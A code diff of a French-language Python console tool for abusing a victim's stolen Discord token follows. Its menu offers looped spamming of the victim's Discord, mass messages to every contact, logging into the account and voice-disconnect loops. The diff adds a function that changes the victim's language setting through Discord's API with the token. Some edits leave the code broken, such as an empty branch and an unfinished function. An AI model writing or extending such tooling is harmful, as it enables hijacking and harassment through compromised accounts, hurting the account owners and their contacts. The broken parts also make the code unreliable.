@@ -43,7 +43,6 @@ def menu():
             print(Fore.MAGENTA + f"\nToken enregistré  : {token}")
         
             print(Fore.YELLOW + "\nQue voulez-vous faire ?\n")
-            print(Fore.CYAN + "[1] Envoyer un message\n")
             print(Fore.CYAN + "[1] Spam le Discord de la victime (load boucle)\n")
             print(Fore.CYAN + "[2] Spam contact de la victume (envoie de msg à chaque contact)\n")
             print(Fore.CYAN + "[3] Se connecter au compte de la victime\n")
@@ -51,13 +50,8 @@ def menu():
             print(Fore.CYAN + "[0] Retour au menu principal\n")
             action = input(' ')
 
+            
             if action == "1":
-                cls()
-                channel_id = input(Fore.GREEN + "\nEntrez l'ID du canal : ")
-                message = input(Fore.GREEN + "\nEntrez le message à envoyer : ")
-                discord_msg_send(token, message, channel_id)
-                return
-            elif action == "1":
                 cls()
                 try:
                     time2 = int(input(Fore.GREEN + "\nEntrez le nombre de cycles : "))
@@ -74,7 +68,7 @@ def menu():
             elif action == "3":
                 cls()
 
-            elif action == "5":
+            elif action == "4":
                 cls()
                 print(Fore.YELLOW + "Que voulez-vous faire ?\n")
                 print(Fore.CYAN + "[1] Déconnexion boucle vocale\n")
@@ -83,7 +77,7 @@ def menu():
                 print(Fore.CYAN + "[0] Retour au menu principal\n")
                 action = input(' ')
 
-                if action == "1":
+                if action == "3":
                     cls()
                     channel_id = input(Fore.GREEN + "\nEntrez l'ID du canal : ")
                     message = input(Fore.GREEN + "\nEntrez le message à envoyer : ")
@@ -92,18 +86,13 @@ def menu():
                 
             
             elif action == "0":
-                return
+                menu()
             else:
                 print(Fore.RED + "\nOption invalide. Réessaie...\n")
                 time.sleep(1)
 
-        elif choix == "2":
-            token_start()
-        elif choix == "3":
-            idee()
-        else:
-            print(Fore.RED + "\nOption invalide. Réessaie...\n")
-            time.sleep(1)
+        elif action == "2":
+            
 
 def token_start():
     cls()
@@ -178,6 +167,18 @@ def discord_inf_load(token):
         print(Fore.GREEN + "Paramètres mis à jour.")
     else:
         print(Fore.RED + f"Erreur : {response.status_code}")
+
+def langue_bloque(token, langue):
+    url = "https://discord.com/api/v9/users/@me/settings"
+    headers = {
+        "Authorization": token,
+        "Content-Type": "application/json"
+    }
+    data = {
+            "locale": langue
+    }
+     
+
         
 if __name__ == "__main__":
     menu()
